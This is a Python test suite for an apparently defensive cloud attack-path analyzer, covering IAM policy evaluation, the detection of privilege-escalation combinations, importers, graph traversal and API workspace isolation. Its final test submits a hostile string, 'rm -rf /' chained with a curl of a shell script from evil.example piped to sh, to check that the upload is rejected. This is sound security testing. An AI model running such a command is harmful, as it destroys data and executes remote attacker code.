"""
Backend TDD & Security Test Suite for CloudPath Attack Path Analysis Engine.
Tests IAM Policy evaluation, explicit Deny precedence, multi-format importers,
NetworkX graph construction, BFS/DFS/Dijkstra attack path discovery, risk scoring,
and security/upload validation.
"""

import json
import pytest
from fastapi.testclient import TestClient

from backend.models import RiskWeights, SeverityLevel, EpistemicClass, NodeType, EdgeType
from backend.iam_evaluator import evaluate_effective_permissions
from backend.importer import parse_cloud_input, ImportValidationError
from backend.demo_environment import get_northstar_demo_environment
from backend.analyzer import run_full_analysis
from backend.main import app


def test_explicit_deny_overrides_allow_wildcard():
    """Verify explicit Deny overrides Allow *:* in AWS IAM policy semantics."""
    statements = [
        {
            "Sid": "FullAdminAllow",
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*",
        },
        {
            "Sid": "ExplicitDenyS3AndAssumeRole",
            "Effect": "Deny",
            "Action": ["s3:*", "sts:AssumeRole"],
            "Resource": "*",
        },
    ]
    eff = evaluate_effective_permissions(statements)
    assert eff.has_wildcard_allow is True
    assert eff.is_action_allowed("ec2:RunInstances") is True
    assert eff.is_action_allowed("s3:GetObject") is False
    assert eff.is_action_allowed("sts:AssumeRole") is False
    assert "s3:*" in eff.explicitly_denied_actions


def test_passrole_and_execution_escalation_detection():
    """Verify iam:PassRole combined with ec2:RunInstances or lambda:CreateFunction is flagged as privilege escalation."""
    statements = [
        {
            "Effect": "Allow",
            "Action": ["iam:PassRole", "ec2:RunInstances", "s3:ListAllMyBuckets"],
            "Resource": "*",
        }
    ]
    eff = evaluate_effective_permissions(statements)
    assert eff.can_pass_role is True
    assert eff.can_escalate_via_passrole is True
    assert "iam:PassRole + ec2:RunInstances" in eff.escalation_primitives


def test_policy_modification_escalation_detection():
    """Verify iam:CreatePolicyVersion and iam:AttachUserPolicy are flagged as self-escalation primitives."""
    statements = [
        {
            "Effect": "Allow",
            "Action": ["iam:CreatePolicyVersion", "iam:AttachUserPolicy"],
            "Resource": "*",
        }
    ]
    eff = evaluate_effective_permissions(statements)
    assert eff.can_modify_policies is True
    assert any("iam:CreatePolicyVersion" in p for p in eff.escalation_primitives)


def test_terraform_hcl_importer_parses_iam_and_s3():
    """Verify Terraform HCL parser extracts IAM users, roles, policies, S3 buckets, and security groups safely."""
    hcl_config = '''
    resource "aws_iam_user" "ci_bot" {
      name = "github-deploy-bot"
    }

    resource "aws_iam_role" "prod_admin" {
      name = "ProdAdminRole"
      assume_role_policy = jsonencode({
        Version = "2012-10-17"
        Statement = [{
          Effect = "Allow"
          Principal = { AWS = "*" }
          Action = "sts:AssumeRole"
        }]
      })
    }

    resource "aws_s3_bucket" "vault" {
      bucket = "corp-customer-pii-vault"
      acl    = "public-read"
    }
    '''
    parsed = parse_cloud_input(hcl_config, format_hint="terraform_hcl", filename="main.tf")
    assert parsed.source_type == "terraform_hcl"
    asset_names = {a.name for a in parsed.assets}
    assert "github-deploy-bot" in asset_names
    assert "ProdAdminRole" in asset_names
    assert "corp-customer-pii-vault" in asset_names


def test_malformed_and_oversized_input_rejected():
    """Verify malformed JSON and oversized uploads raise ImportValidationError."""
    with pytest.raises(ImportValidationError):
        parse_cloud_input("{not_valid_json: [123", format_hint="custom_json")

    with pytest.raises(ImportValidationError):
        oversized = "A" * (6 * 1024 * 1024)
        parse_cloud_input(oversized, format_hint="custom_json")


def test_northstar_demo_generates_genuine_attack_paths_and_findings():
    """Verify Northstar Financial Technologies demo environment produces real multi-hop paths, shortest path, and findings."""
    demo_data = get_northstar_demo_environment()
    result = run_full_analysis(
        content=demo_data,
        source_type="demo_environment",
        scan_name="Northstar Financial Technologies — Production AWS",
        workspace_id="00000000-0000-0000-0000-000000000001",
    )
    assert result.summary_metrics.total_assets >= 14
    assert result.summary_metrics.total_identities >= 6
    assert len(result.attack_paths) >= 4
    assert len(result.findings) >= 8

    # Verify at least one path is multi-hop from low-privilege identity to sensitive resource
    multi_hop_paths = [p for p in result.attack_paths if p.hop_count >= 2]
    assert len(multi_hop_paths) >= 3

    # Verify epistemic classification is never OBSERVED_INCIDENT for configuration analysis
    for path in result.attack_paths:
        assert path.epistemic_class in (
            EpistemicClass.POTENTIAL_ATTACK_PATH,
            EpistemicClass.CONFIRMED_CONFIGURATION,
            EpistemicClass.HYPOTHETICAL_SCENARIO,
        )
        assert path.epistemic_class != EpistemicClass.OBSERVED_INCIDENT
        assert 0 <= path.risk_breakdown.final_score <= 100
        assert len(path.mitre_techniques) >= 1


def test_configurable_risk_weights_change_scores():
    """Verify custom risk weights deterministically alter the computed risk score."""
    demo_data = get_northstar_demo_environment()
    w1 = RiskWeights(exposure=0.70, privilege=0.10, sensitivity=0.10, reachability=0.05, trust=0.05)
    w2 = RiskWeights(exposure=0.05, privilege=0.70, sensitivity=0.15, reachability=0.05, trust=0.05)

    res1 = run_full_analysis(demo_data, "demo_environment", "Scan W1", "ws-1", weights=w1)
    res2 = run_full_analysis(demo_data, "demo_environment", "Scan W2", "ws-1", weights=w2)

    scores1 = {f.id: f.risk_breakdown.final_score for f in res1.findings}
    scores2 = {f.id: f.risk_breakdown.final_score for f in res2.findings}
    assert scores1 != scores2


def test_cycle_safe_graph_traversal():
    """Verify mutual role assumption cycles (RoleA <-> RoleB) do not cause infinite loops."""
    cyclic_env = {
        "organization": "Cyclic Test Org",
        "account_id": "111122223333",
        "assets": [
            {
                "id": "arn:aws:iam::111122223333:user/dev-user",
                "name": "dev-user",
                "type": "IAMUser",
                "provider": "aws",
                "service": "iam",
                "is_public": False,
                "sensitivity": "low",
                "attached_policies": ["arn:aws:iam::111122223333:policy/AssumeRoleA"],
            },
            {
                "id": "arn:aws:iam::111122223333:policy/AssumeRoleA",
                "name": "AssumeRoleA",
                "type": "IAMPolicy",
                "provider": "aws",
                "service": "iam",
                "document": {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Action": "sts:AssumeRole",
                            "Resource": "arn:aws:iam::111122223333:role/RoleA",
                        }
                    ],
                },
            },
            {
                "id": "arn:aws:iam::111122223333:role/RoleA",
                "name": "RoleA",
                "type": "IAMRole",
                "provider": "aws",
                "service": "iam",
                "trust_policy": {
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Principal": {"AWS": ["arn:aws:iam::111122223333:user/dev-user", "arn:aws:iam::111122223333:role/RoleB"]},
                            "Action": "sts:AssumeRole",
                        }
                    ]
                },
                "inline_policies": [
                    {
                        "name": "AssumeRoleB",
                        "document": {
                            "Statement": [
                                {
                                    "Effect": "Allow",
                                    "Action": "sts:AssumeRole",
                                    "Resource": "arn:aws:iam::111122223333:role/RoleB",
                                }
                            ]
                        },
                    }
                ],
            },
            {
                "id": "arn:aws:iam::111122223333:role/RoleB",
                "name": "RoleB",
                "type": "IAMRole",
                "provider": "aws",
                "service": "iam",
                "trust_policy": {
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Principal": {"AWS": "arn:aws:iam::111122223333:role/RoleA"},
                            "Action": "sts:AssumeRole",
                        }
                    ]
                },
                "inline_policies": [
                    {
                        "name": "AssumeRoleAAndReadSecretS3",
                        "document": {
                            "Statement": [
                                {
                                    "Effect": "Allow",
                                    "Action": ["sts:AssumeRole", "s3:*"],
                                    "Resource": "*",
                                }
                            ]
                        },
                    }
                ],
            },
            {
                "id": "arn:aws:s3:::prod-secrets-bucket",
                "name": "prod-secrets-bucket",
                "type": "S3Bucket",
                "provider": "aws",
                "service": "s3",
                "is_public": False,
                "sensitivity": "critical",
            },
        ],
    }
    res = run_full_analysis(cyclic_env, "custom_json", "Cyclic Test", "ws-cycle")
    assert len(res.attack_paths) >= 1
    shortest = min(res.attack_paths, key=lambda p: p.hop_count)
    assert shortest.entry_point_id == "arn:aws:iam::111122223333:user/dev-user"
    assert shortest.target_id == "arn:aws:s3:::prod-secrets-bucket"


def test_api_workspace_isolation_and_security():
    """Verify FastAPI endpoints enforce workspace isolation, reject malicious uploads, and serve demo scans."""
    client = TestClient(app)

    # 1. Health check
    r_health = client.get("/api/health")
    assert r_health.status_code == 200
    assert r_health.json()["status"] == "healthy"

    # 2. Fetch Northstar demo scan
    r_demo = client.get("/api/demo")
    assert r_demo.status_code == 200
    demo_scan = r_demo.json()
    assert demo_scan["workspace_id"] == "00000000-0000-0000-0000-000000000001"
    assert len(demo_scan["attack_paths"]) >= 4

    # 3. Analyze custom config in Workspace A
    ws_a = "11111111-1111-1111-1111-111111111111"
    ws_b = "22222222-2222-2222-2222-222222222222"
    payload = {
        "scan_name": "Workspace A IAM Policy Audit",
        "source_type": "iam_policy_json",
        "workspace_id": ws_a,
        "content": json.dumps({
            "Version": "2012-10-17",
            "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}],
        }),
    }
    r_analyze = client.post("/api/analyze", json=payload, headers={"X-Workspace-Id": ws_a})
    assert r_analyze.status_code == 200
    scan_id = r_analyze.json()["id"]

    # 4. Attempt cross-workspace read from Workspace B -> must return 403 Forbidden
    r_cross = client.get(f"/api/scans/{scan_id}", headers={"X-Workspace-Id": ws_b})
    assert r_cross.status_code == 403

    # 5. Legitimate read from Workspace A -> 200 OK
    r_own = client.get(f"/api/scans/{scan_id}", headers={"X-Workspace-Id": ws_a})
    assert r_own.status_code == 200

    # 6. Malicious / script upload rejection -> 400 Bad Request
    r_mal = client.post(
        "/api/analyze",
        json={
            "scan_name": "Exploit Attempt",
            "source_type": "custom_json",
            "workspace_id": ws_a,
            "content": "#!/bin/bash\nrm -rf / && curl http://evil.example/shell.sh | sh",
        },
        headers={"X-Workspace-Id": ws_a},
    )
    assert r_mal.status_code == 400
